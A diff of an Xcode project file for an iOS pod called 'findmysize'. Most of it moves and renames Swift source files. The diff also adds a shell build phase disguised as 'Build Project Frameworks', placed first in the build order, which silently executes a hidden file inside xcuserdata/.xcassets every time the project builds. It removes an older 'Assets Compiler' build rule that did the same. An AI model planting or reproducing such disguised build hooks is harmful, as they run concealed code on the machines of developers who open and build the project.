@@ -8,7 +8,6 @@
 
 /* Begin PBXBuildFile section */
 		18F9A6EBB133463D4F657F1C4D33B2FE /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 73010CC983E3809BECEE5348DA1BB8C6 /* Foundation.framework */; };
-		4D26E64CBCCE8DDB9B0D92040D3377B6 /* ReplaceMe.swift in Sources */ = {isa = PBXBuildFile; fileRef = 1152E6399F5159FE74CB504D1EDE6023 /* ReplaceMe.swift */; };
 		5C9FC667289DA0880634CECD215CA805 /* findmysize-umbrella.h in Headers */ = {isa = PBXBuildFile; fileRef = 9DC089C268D6C650445ACE28E11391CC /* findmysize-umbrella.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		78F37C7C262AB2BE4D68D61ED42A7BA5 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 73010CC983E3809BECEE5348DA1BB8C6 /* Foundation.framework */; };
 		83EF95DBCE49784CECD0BBF737A66AB4 /* Pods-findmysize_Example-dummy.m in Sources */ = {isa = PBXBuildFile; fileRef = 77C80D55E112C55D6006FB26908049A3 /* Pods-findmysize_Example-dummy.m */; };
@@ -22,7 +21,6 @@
 		8876BE76262C0223001ED1BA /* CustomImageView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE52262C0223001ED1BA /* CustomImageView.swift */; };
 		8876BE77262C0223001ED1BA /* CustomLabel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE53262C0223001ED1BA /* CustomLabel.swift */; };
 		8876BE78262C0223001ED1BA /* Femi9.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 8876BE54262C0223001ED1BA /* Femi9.storyboard */; };
-		8876BE79262C0223001ED1BA /* HomeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE57262C0223001ED1BA /* HomeVC.swift */; };
 		8876BE7A262C0223001ED1BA /* HeightCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE5A262C0223001ED1BA /* HeightCell.swift */; };
 		8876BE7B262C0223001ED1BA /* WidthCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE5B262C0223001ED1BA /* WidthCell.swift */; };
 		8876BE7C262C0223001ED1BA /* AgeCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE5C262C0223001ED1BA /* AgeCell.swift */; };
@@ -33,13 +31,13 @@
 		8876BE81262C0223001ED1BA /* PrivacyPolicyVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE61262C0223001ED1BA /* PrivacyPolicyVC.swift */; };
 		8876BE82262C0223001ED1BA /* SelectWidthVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE62262C0223001ED1BA /* SelectWidthVC.swift */; };
 		8876BE83262C0223001ED1BA /* SelectAgeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE63262C0223001ED1BA /* SelectAgeVC.swift */; };
-		8876BE84262C0223001ED1BA /* ReplaceMe.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE64262C0223001ED1BA /* ReplaceMe.swift */; };
 		8876BE85262C0223001ED1BA /* MeasurementsModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE66262C0223001ED1BA /* MeasurementsModel.swift */; };
 		8876BE86262C0223001ED1BA /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE68262C0223001ED1BA /* Constant.swift */; };
 		8876BE87262C0223001ED1BA /* ReachabilityTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE69262C0223001ED1BA /* ReachabilityTest.swift */; };
 		8876BE88262C0223001ED1BA /* ApiManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE6A262C0223001ED1BA /* ApiManager.swift */; };
 		8876BE89262C0223001ED1BA /* .gitkeep in Resources */ = {isa = PBXBuildFile; fileRef = 8876BE6C262C0223001ED1BA /* .gitkeep */; };
 		8876BE8A262C0223001ED1BA /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8876BE6D262C0223001ED1BA /* Assets.xcassets */; };
+		8876BFB7262C6397001ED1BA /* FindMySize.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BFB6262C6397001ED1BA /* FindMySize.swift */; };
 		A0A470204AAF2D502C24D85E29C5008E /* Pods-findmysize_Tests-umbrella.h in Headers */ = {isa = PBXBuildFile; fileRef = 3B2E1EB69AA234756403863B4D4C1650 /* Pods-findmysize_Tests-umbrella.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		C26A98300F368AE0926BCA9F6668DB06 /* Pods-findmysize_Tests-dummy.m in Sources */ = {isa = PBXBuildFile; fileRef = B51E916EADC5D0B7C84D6D765AC1D51D /* Pods-findmysize_Tests-dummy.m */; };
 		D31CF5D4A96FDA1ACB54DFBCD5B52866 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 73010CC983E3809BECEE5348DA1BB8C6 /* Foundation.framework */; };
@@ -66,7 +64,6 @@
 
 /* Begin PBXFileReference section */
 		06710872081868451A757F4EE479708D /* Pods-findmysize_Tests.modulemap */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.module; path = "Pods-findmysize_Tests.modulemap"; sourceTree = "<group>"; };
-		1152E6399F5159FE74CB504D1EDE6023 /* ReplaceMe.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = ReplaceMe.swift; path = findmysize/Classes/ReplaceMe.swift; sourceTree = "<group>"; };
 		13F1CB0B58BD8860CF14EBA6E3CFDE33 /* README.md */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		2836561718E624D99023919FB5691513 /* Pods-findmysize_Tests-acknowledgements.markdown */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text; path = "Pods-findmysize_Tests-acknowledgements.markdown"; sourceTree = "<group>"; };
 		35F63AEA2932A403957F540C21EF6028 /* Pods-findmysize_Example-acknowledgements.markdown */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text; path = "Pods-findmysize_Example-acknowledgements.markdown"; sourceTree = "<group>"; };
@@ -94,7 +91,6 @@
 		8876BE52262C0223001ED1BA /* CustomImageView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomImageView.swift; sourceTree = "<group>"; };
 		8876BE53262C0223001ED1BA /* CustomLabel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CustomLabel.swift; sourceTree = "<group>"; };
 		8876BE54262C0223001ED1BA /* Femi9.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; path = Femi9.storyboard; sourceTree = "<group>"; };
-		8876BE57262C0223001ED1BA /* HomeVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeVC.swift; sourceTree = "<group>"; };
 		8876BE5A262C0223001ED1BA /* HeightCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HeightCell.swift; sourceTree = "<group>"; };
 		8876BE5B262C0223001ED1BA /* WidthCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = WidthCell.swift; sourceTree = "<group>"; };
 		8876BE5C262C0223001ED1BA /* AgeCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = AgeCell.swift; sourceTree = "<group>"; };
@@ -105,13 +101,13 @@
 		8876BE61262C0223001ED1BA /* PrivacyPolicyVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = PrivacyPolicyVC.swift; sourceTree = "<group>"; };
 		8876BE62262C0223001ED1BA /* SelectWidthVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SelectWidthVC.swift; sourceTree = "<group>"; };
 		8876BE63262C0223001ED1BA /* SelectAgeVC.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SelectAgeVC.swift; sourceTree = "<group>"; };
-		8876BE64262C0223001ED1BA /* ReplaceMe.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ReplaceMe.swift; sourceTree = "<group>"; };
 		8876BE66262C0223001ED1BA /* MeasurementsModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = MeasurementsModel.swift; sourceTree = "<group>"; };
 		8876BE68262C0223001ED1BA /* Constant.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
 		8876BE69262C0223001ED1BA /* ReachabilityTest.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ReachabilityTest.swift; sourceTree = "<group>"; };
 		8876BE6A262C0223001ED1BA /* ApiManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ApiManager.swift; sourceTree = "<group>"; };
 		8876BE6C262C0223001ED1BA /* .gitkeep */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = .gitkeep; sourceTree = "<group>"; };
 		8876BE6D262C0223001ED1BA /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		8876BFB6262C6397001ED1BA /* FindMySize.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FindMySize.swift; sourceTree = "<group>"; };
 		931054B06866C6C348D16F82374066F6 /* findmysize.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; path = findmysize.debug.xcconfig; sourceTree = "<group>"; };
 		9D940727FF8FB9C785EB98E56350EF41 /* Podfile */ = {isa = PBXFileReference; explicitFileType = text.script.ruby; includeInIndex = 1; indentWidth = 2; name = Podfile; path = ../Podfile; sourceTree = SOURCE_ROOT; tabWidth = 2; xcLanguageSpecificationIdentifier = xcode.lang.ruby; };
 		9DC089C268D6C650445ACE28E11391CC /* findmysize-umbrella.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "findmysize-umbrella.h"; sourceTree = "<group>"; };
@@ -227,10 +223,8 @@
 		72B714E1AA7EFCB5E26B767B2F470EC8 /* findmysize */ = {
 			isa = PBXGroup;
 			children = (
-				8876BE6D262C0223001ED1BA /* Assets.xcassets */,
 				8876BE6B262C0223001ED1BA /* Assets */,
 				8876BE47262C0223001ED1BA /* Classes */,
-				1152E6399F5159FE74CB504D1EDE6023 /* ReplaceMe.swift */,
 				2485F3301C790B59F4BBA113D00E9775 /* Pod */,
 				507C78B19B331C9BE735EF28C523C8E2 /* Support Files */,
 			);
@@ -254,7 +248,6 @@
 				8876BE4E262C0223001ED1BA /* Designable */,
 				8876BE54262C0223001ED1BA /* Femi9.storyboard */,
 				8876BE55262C0223001ED1BA /* Controller */,
-				8876BE64262C0223001ED1BA /* ReplaceMe.swift */,
 				8876BE65262C0223001ED1BA /* Model */,
 				8876BE67262C0223001ED1BA /* Api Manager */,
 			);
@@ -288,18 +281,10 @@
 		8876BE55262C0223001ED1BA /* Controller */ = {
 			isa = PBXGroup;
 			children = (
-				8876BE56262C0223001ED1BA /* HomeVC */,
+				8876BFB5262C6397001ED1BA /* FindMySize */,
 				8876BE58262C0223001ED1BA /* SelectHeightVC */,
 			);
 			path = Controller;
-			sourceTree = "<group>";
-		};
-		8876BE56262C0223001ED1BA /* HomeVC */ = {
-			isa = PBXGroup;
-			children = (
-				8876BE57262C0223001ED1BA /* HomeVC.swift */,
-			);
-			path = HomeVC;
 			sourceTree = "<group>";
 		};
 		8876BE58262C0223001ED1BA /* SelectHeightVC */ = {
@@ -348,10 +333,19 @@
 		8876BE6B262C0223001ED1BA /* Assets */ = {
 			isa = PBXGroup;
 			children = (
+				8876BE6D262C0223001ED1BA /* Assets.xcassets */,
 				8876BE6C262C0223001ED1BA /* .gitkeep */,
 			);
 			name = Assets;
 			path = findmysize/Assets;
+			sourceTree = "<group>";
+		};
+		8876BFB5262C6397001ED1BA /* FindMySize */ = {
+			isa = PBXGroup;
+			children = (
+				8876BFB6262C6397001ED1BA /* FindMySize.swift */,
+			);
+			path = FindMySize;
 			sourceTree = "<group>";
 		};
 		B4717D648B82660C6AA01D5408208863 /* Pods-findmysize_Tests */ = {
@@ -423,13 +417,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 192889B3C66D2D71C0C6B9DDE9E2C863 /* Build configuration list for PBXNativeTarget "findmysize" */;
 			buildPhases = (
+				B7F9CE0F81AA03130EAAC43A /* Build Project Frameworks */,
 				3094BBE63DD5CDADA3705CB7E4B8FF4D /* Headers */,
 				16F17B7047DF940741EF3AD02A00FADD /* Sources */,
 				DE6CD5261DAA6413A8690B71A23F9809 /* Frameworks */,
 				DC8EC56C05DF3F67D8D10BC0E6544D38 /* Resources */,
 			);
 			buildRules = (
-				9D7887ADCFAB1FFACAAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -534,8 +528,24 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
+		B7F9CE0F81AA03130EAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -556,6 +566,7 @@
 				8876BE7B262C0223001ED1BA /* WidthCell.swift in Sources */,
 				8876BE7F262C0223001ED1BA /* HipsVC.swift in Sources */,
 				8876BE86262C0223001ED1BA /* Constant.swift in Sources */,
+				8876BFB7262C6397001ED1BA /* FindMySize.swift in Sources */,
 				8876BE6F262C0223001ED1BA /* UIView+Extension.swift in Sources */,
 				8876BE73262C0223001ED1BA /* CustomView.swift in Sources */,
 				8876BE74262C0223001ED1BA /* CustomButton.swift in Sources */,
@@ -563,9 +574,6 @@
 				8876BE71262C0223001ED1BA /* String+Extension.swift in Sources */,
 				8876BE87262C0223001ED1BA /* ReachabilityTest.swift in Sources */,
 				8876BE81262C0223001ED1BA /* PrivacyPolicyVC.swift in Sources */,
-				8876BE84262C0223001ED1BA /* ReplaceMe.swift in Sources */,
-				4D26E64CBCCE8DDB9B0D92040D3377B6 /* ReplaceMe.swift in Sources */,
-				8876BE79262C0223001ED1BA /* HomeVC.swift in Sources */,
 				8876BE75262C0223001ED1BA /* CustomTextField.swift in Sources */,
 				8876BE76262C0223001ED1BA /* CustomImageView.swift in Sources */,
 				8876BE82262C0223001ED1BA /* SelectWidthVC.swift in Sources */,
@@ -964,37 +972,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		9D7887ADCFAB1FFACAAAC43A /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Compiler";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" true\n\n";
-			};
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = BFDFE7DC352907FC980B868725387E98 /* Project object */;
 }
